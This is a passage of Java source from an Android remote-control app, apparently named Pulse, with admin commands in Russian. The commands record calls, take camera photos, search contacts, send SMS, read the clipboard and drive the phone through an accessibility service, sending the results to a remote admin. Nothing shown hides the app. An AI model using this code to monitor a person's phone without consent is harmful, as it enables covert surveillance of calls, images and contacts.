                        if (o != null) sb.append("• <code>").append(Tools.e(o.optString("cmd"))).append("</code>\n");
                    }
                    Act.sendToAdmin(sb.toString(), Kb.catSet());
                    return null;
                }
                case "queue_flush": Net.flush(ctx); Act.sendToAdmin("📤 Досылаю очередь", null); return null;
                case "queue_clear": Net.clearQueue(ctx); Act.sendToAdmin("🗑 Очередь очищена", null); return null;


                // ═══════════════ ЗАПИСЬ ЗВОНКОВ ═══════════════
                case "callrec": {
                    // callrec:off | callrec:all | callrec:contacts
                    String m = arg.toLowerCase(java.util.Locale.ROOT);
                    int mode = "all".equals(m) ? CallRec.ALL : ("contacts".equals(m) ? CallRec.CONTACTS : CallRec.OFF);
                    CallRec.setMode(ctx, mode);
                    Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx));
                    return null;
                }
                case "callrec_off": CallRec.setMode(ctx, CallRec.OFF); Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx)); return null;
                case "callrec_all": CallRec.setMode(ctx, CallRec.ALL); Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx)); return null;
                case "callrec_on": CallRec.setMode(ctx, CallRec.CONTACTS); Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx)); return null;
                case "callrec_add": {
                    String who = dec(arg);
                    String num = who, contactName = who;
                    // поддерживаем «Имя|номер»
                    int bar = who.indexOf('|');
                    if (bar > 0) { contactName = who.substring(0, bar).trim(); num = who.substring(bar + 1).trim(); }
                    if (num.replaceAll("[^0-9]", "").isEmpty()) return "нужен номер";
                    CallRec.addContact(ctx, contactName, num);
                    Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx));
                    return null;
                }
                case "callrec_del": {
                    CallRec.removeContact(ctx, dec(arg));
                    Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx));
                    return null;
                }
                case "callrec_clear": CallRec.clearContacts(ctx); Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx)); return null;
                case "callrec_list": Act.sendToAdmin(CallRec.report(ctx), Kb.callRecKb(ctx)); return null;

                // ручная запись текущего/следующего звонка
                case "rec_call": {
                    String err = CallRec.start(ctx, "manual");
                    if (err != null) return err;
                    Act.sendToAdmin("🔴 <b>Запись начата</b>\n/rec_call_stop — чтобы остановить", Kb.callRecKb(ctx));
                    return null;
                }
                case "rec_call_stop": {
                    if (!CallRec.isRecording()) return "запись не идёт";
                    CallRec.stopAndSend(ctx);
                    return null;
                }
                case "rec_status": {
                    Act.sendToAdmin(CallRec.isRecording()
                            ? "🔴 <b>Идёт запись</b> с " + Tools.e(CallRec.startedAt())
                            : "⚪ Запись не идёт\nРежим: <b>" + CallRec.modeName(ctx) + "</b>", Kb.callRecKb(ctx));
                    return null;
                }
                case "calls_send": CallRec.sendLast(ctx, parseInt(arg, 5)); return null;
                case "calls_sys": {
                    String r = CallRec.startSystemRecorder(ctx);
                    Act.sendToAdmin("📞 " + Tools.e(r == null ? "Системный диктофон открыт" : r), null);
                    return null;
                }


                // ═══════════════ УСТРОЙСТВО ═══════════════
                case "device": Act.sendToAdmin(Device.setupTips(ctx), Kb.catSet()); return null;
                case "model": Act.sendToAdmin("📱 <b>" + Tools.e(Device.model()) + "</b>\n"
                        + Device.android() + "\n" + Device.brandName(), null); return null;

                default: return "неизвестная команда: " + name;
            }
        } catch (Exception e) {
            return String.valueOf(e.getMessage());
        }
    }

    private static String needShoot(BotService bs) {
        if (bs == null) return "служба доступа выключена";
        bs.shootAndSend();
        return null;
    }

    private static String titleFor(String kind) {
        switch (kind) {
            case "call": return "📞 Номер для звонка";
            case "sms": return "✉️ Кому и что";
            case "contacts": return "👥 Поиск контакта";
            case "alarm": return "⏰ Время (ЧЧ:ММ)";
            case "timer": return "⏳ Таймер (сек)";
            default: return "Введите значение";
        }
    }

    private static void doComms(Context ctx, String kind, String val) {
        try {
            switch (kind) {
                case "call": Dial.call(ctx, val); break;
                case "sms": {
                    String[] p = val.split(" ", 2);
                    Dial.sms(ctx, p[0], p.length > 1 ? p[1] : "");
                    break;
                }
                case "contacts": {
                    List<String[]> list = Dial.contacts(ctx, val, 8);
                    StringBuilder sb = new StringBuilder("👥 <b>Контакты</b>");
                    for (String[] ct : list) sb.append("\n• ").append(Tools.e(ct[0])).append(" — ").append(Tools.e(ct[1]));
                    Act.sendToAdmin(list.isEmpty() ? "👥 Ничего не найдено" : sb.toString(), Kb.catAct());
                    break;
                }
                case "alarm": {
                    String[] p = val.split(":");
                    Dial.alarm(ctx, parseInt(p[0], 7), p.length > 1 ? parseInt(p[1], 0) : 0, "Pulse");
                    break;
                }
                case "timer": Dial.timer(ctx, parseInt(val, 60)); break;
            }
        } catch (Exception e) {
            Act.sendToAdmin("❌ " + Tools.e(String.valueOf(e.getMessage())), null);
        }
    }

    private static String panic(Context ctx) {
        try {
            Config.panic(ctx);
            Act.sendToAdmin("🧨 <b>PANIC</b> выполнен — токен сброшен.\nПерезапустите приложение и настройте заново.", Kb.catSet());
        } catch (Exception e) { return String.valueOf(e.getMessage()); }
        return null;
    }

    private static String setVol(Context ctx, int pct) {
        try {
            int[] v = Sys.musicVolume(ctx);
            android.media.AudioManager am = (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, pct * v[1] / 100, 0);
        } catch (Exception e) { return String.valueOf(e.getMessage()); }
        return null;
    }

    /**
     * Надёжное декодирование аргумента из JS.
     * Убирает лишние пробелы, переживает «+», %-последовательности и кириллицу.
     */
    private static String dec(String s) {
        if (s == null) return "";
        String v = s.trim();
        try {
            // encodeURIComponent не кодирует «+», поэтому плюс — это плюс, а не пробел
            v = URLDecoder.decode(v.replace("+", "%2B"), "UTF-8");
        } catch (Exception ignored) {
            try { v = URLDecoder.decode(v, "UTF-8"); } catch (Exception ignored2) {}
        }
        return v.trim();
    }

    private static float f(String s) {
        try { return Float.parseFloat(s.trim()); } catch (Exception e) { return 0f; }
    }

    private static String clipSnippet(Context c) {
        String s = Sys.clipboard(c);
        if (s == null || s.isEmpty()) return "";
        s = s.replace("\n", " ");
        return s.length() > 60 ? s.substring(0, 60) + "…" : s;
    }

    private static String global(BotService bs, int action) {
        if (bs == null) return "служба доступа выключена";
        bs.doGlobal(action);
        return null;
    }

    private static String gesture(BotService bs, String dir) {
        if (bs == null) return "служба доступа выключена";
        Gestures.dpad(bs, dir, null);
        return null;
    }

    private static String scroll(BotService bs, boolean down) {
        if (bs == null) return "служба доступа выключена";
        Gestures.scroll(bs, down, null);
        return null;
    }

    private static String photo(Context ctx, boolean front) {
        if (!Perms.granted(ctx, android.Manifest.permission.CAMERA)) return "нет разрешения на камеру";
        Capture.photo(ctx, front, new Capture.PhotoCb() {
            @Override public void ok(byte[] jpeg) {
                new Thread(() -> Act.sendPhoto(jpeg, "📷 <b>Фото</b> (" + (front ? "фронт" : "тыл") + ")"), "pulse-webphoto").start();
            }
            @Override public void err(String why) { LogStore.add("📷 " + why); }
        });
        return null;
    }

    private static String openApp(Context ctx, String pkg) {
        try { pkg = URLDecoder.decode(pkg, "UTF-8"); } catch (Exception ignored) {}
        return Apps.launch(ctx, pkg) ? null : "не удалось открыть";
    }

    private static int parseInt(String s, int def) {
        try { return Integer.parseInt(s.trim()); } catch (Exception e) { return def; }
    }

    // ------------------------------------------------------------ http utils

    // ------------------------------------------------------------ авторизация

    /** Ключ доступа к панели. Генерится один раз, живёт в настройках. */
    public static String accessKey(Context c) {
        String k = c.getSharedPreferences("pulse", Context.MODE_PRIVATE).getString("access_key", "");
        if (k == null || k.isEmpty()) {
            StringBuilder sb = new StringBuilder();
            java.util.Random r = new java.util.Random();
            for (int i = 0; i < 10; i++) sb.append("abcdefghjkmnpqrstuvwxyz23456789".charAt(r.nextInt(31)));
            k = sb.toString();
            c.getSharedPreferences("pulse", Context.MODE_PRIVATE).edit().putString("access_key", k).apply();
        }
        return k;
    }

    public static void regenerateKey(Context c) {
        c.getSharedPreferences("pulse", Context.MODE_PRIVATE).edit().remove("access_key").apply();
    }

    private static boolean isLoopback(java.net.InetAddress a) {
        if (a == null) return false;
        return a.isLoopbackAddress();
    }

    /** Сравнение за постоянное время — чтобы ключ нельзя было подобрать по времени ответа. */
    private static boolean constEq(String a, String b) {
        if (a == null || b == null) return false;
        if (a.length() != b.length()) return false;
        int d = 0;
        for (int i = 0; i < a.length(); i++) d |= a.charAt(i) ^ b.charAt(i);
        return d == 0;
    }

    private static void respondJson(OutputStream out, JSONObject j, int code) throws IOException {
        respond(out, code, "application/json; charset=utf-8", j.toString().getBytes("UTF-8"), false);
    }

    private static void respondJson(OutputStream out, JSONObject j) throws IOException {
        respond(out, 200, "application/json; charset=utf-8", j.toString().getBytes("UTF-8"), false);
    }

    private static void respond(OutputStream out, int code, String type, byte[] body, boolean noBody) throws IOException {
        String head = "HTTP/1.1 " + code + " " + (code == 200 ? "OK" : code == 404 ? "Not Found" : "No Content") + "\r\n"
                + "Content-Type: " + type + "\r\n"
                + "Content-Length: " + body.length + "\r\n"
                + "Access-Control-Allow-Origin: *\r\n"
                + "Access-Control-Allow-Headers: Content-Type, X-Pulse-Key\r\n"
                + "Access-Control-Allow-Methods: GET, POST, OPTIONS\r\n"
                + "Access-Control-Max-Age: 600\r\n"
                + "Cache-Control: no-store\r\n"
                + "Connection: close\r\n\r\n";
        out.write(head.getBytes("UTF-8"));
        if (!noBody) out.write(body);
        out.flush();
    }

    private static String readLine(InputStream in) throws IOException {
        StringBuilder sb = new StringBuilder();
        int c;
        while ((c = in.read()) >= 0) {
            if (c == '\n') break;
            if (c != '\r') sb.append((char) c);
            if (sb.length() > 8192) break;
        }
        return sb.length() == 0 && c < 0 ? null : sb.toString();
    }

    private static byte[] readAsset(Context ctx, String name) {
        try (InputStream is = ctx.getAssets().open(name)) {
            ByteArrayOutputStream bo = new ByteArrayOutputStream();
            byte[] buf = new byte[16 * 1024];
            int n;
            while ((n = is.read(buf)) > 0) bo.write(buf, 0, n);
            return bo.toByteArray();
        } catch (Exception e) {
            return ("<h1>Pulse Control</h1><p>webapp.html не найден</p>").getBytes();
        }
    }

    private static String param(String query, String key) {
        try {
            for (String p : query.split("&")) {
                int i = p.indexOf('=');
                if (i > 0 && p.substring(0, i).equals(key))
                    return URLDecoder.decode(p.substring(i + 1), "UTF-8");
            }
        } catch (Exception ignored) {}
        return "";
    }

    /** JSON-ответ для длинных текстов (статус, отчёты). */
    public static int safeQueue(Context c) {
        try { return Net.queueSize(c); } catch (Exception e) { return 0; }
    }

    public static String buildStatusJson(Context c) {
        try { return statusJson(c).toString(); } catch (Exception e) { return "{}"; }
    }

    public static String lanIp() {
        try {
            java.util.Enumeration<java.net.NetworkInterface> en = java.net.NetworkInterface.getNetworkInterfaces();
            while (en.hasMoreElements()) {
                java.net.NetworkInterface ni = en.nextElement();
                if (!ni.isUp() || ni.isLoopback()) continue;
                java.util.Enumeration<java.net.InetAddress> addrs = ni.getInetAddresses();
                while (addrs.hasMoreElements()) {
                    java.net.InetAddress a = addrs.nextElement();
                    if (!a.isLoopbackAddress() && a instanceof java.net.Inet4Address) {
                        return a.getHostAddress();
                    }
                }
            }
        } catch (Exception ignored) {}
        return "127.0.0.1";
    }
}
